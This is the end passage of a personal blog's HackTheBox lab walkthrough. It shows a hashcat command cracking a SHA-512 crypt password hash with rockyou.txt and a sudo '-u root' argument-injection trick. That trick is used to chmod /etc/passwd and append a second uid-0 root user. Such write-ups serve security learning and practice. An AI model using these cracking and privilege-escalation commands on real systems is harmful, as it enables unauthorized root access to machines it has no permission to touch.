<pre><code>$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
</code></pre><p>I stuck that hash into a file on my main rig, and ran the hashcat command:
<code>.\hashcat64.exe -m 1800 -a 0 ..\obscur.hash ..\rockyou.txt</code></p>
<p>
    <figure class="left" >
        <img src="1577087612.png"   />

        
    </figure>



    <figure class="left" >
        <img src="1577087971.png"   />

        
    </figure>

</p>
<p>Paydirt, it should be <code>mercedes</code>. Got it quick too, doing 33,718 hashes a second.
Logging in via su worked!</p>

    <figure class="left" >
        <img src="1577088036.png"   />

        
    </figure>


<hr>
<h1 id="getting-root-another-way">Getting Root Another Way</h1>
<p>There&rsquo;s another way to root this machine that I learned about. If you supply <code>sudo</code> with a second <code>-u</code> argument it will ignore the first, therefore if we send <code>-u root &lt;command&gt;</code> to the python shell script it should run as root.</p>
<p>I can&rsquo;t pop <code>/bin/bash</code> over the weird python command prompt, but I can append a root user to the <code>/etc/passwd</code> file and use that to login. I found an example here: <a href="https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file">https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file</a></p>
<p><code>-u root echo &quot;root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</code></p>
<p>This didn&rsquo;t work however, there was an issue using the append operator. I suspect python&rsquo;s <code>subprocess.popen()</code> doesn&rsquo;t allow them.
No matter, I can simply change the access to /etc/passwd so robert can modify it.</p>
<p><code>-u root chmod 777 /etc/passwd</code>
<code>nano /etc/passwd</code></p>
<p>I added <code>root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash</code> to the end of the file, and then used <code>su</code> to login as <code>root2</code> with the password <code>mrcake</code>.</p>
<p>Success! It would have been easier to just read the flag, I always like to pop a shell however.

    <figure class="left" >
        <img src="1577098097.png"   />

        
    </figure>

</p>
<p>Until next time, this is Brian G. signing off!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://foresthex.com/tags/ctf">ctf</a></span><span class="tag"><a href="https://foresthex.com/tags/hackthebox">HackTheBox</a></span><span class="tag"><a href="https://foresthex.com/tags/custom-exploitation">custom exploitation</a></span><span class="tag"><a href="https://foresthex.com/tags/python">python</a></span><span class="tag"><a href="https://foresthex.com/tags/command-injection">command injection</a></span><span class="tag"><a href="https://foresthex.com/tags/cracking">cracking</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1909 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-05-30 00:00 &#43;0000</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h"></span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    
                        <span class="button previous">
                            <a href="https://foresthex.com/posts/hack-the-box-mango/">
                                <span class="button__icon">‚Üê</span>
                                <span class="button__text">Hack The Box - Mango</span>
                            </a>
                        </span>
                    

                    
                        <span class="button next">
                            <a href="https://foresthex.com/posts/hack-the-box-postman/">
                                <span class="button__text">Hack The Box - Postman</span>
                                <span class="button__icon">‚Üí</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        


        <div id="comments" class="thin"><script src="https://utteranc.es/client.js"
        repo="wgehalo/wgehalo.github.io"
        issue-term="pathname"
        label="comment"
        theme="photon-dark"
        crossorigin="anonymous"
        async>
</script></div>

    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
                <span><a href="https://foresthex.com/">Brian G.</a></span>
            
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span> <a href="https://foresthex.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="https://foresthex.com/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>



    </body>
</html>
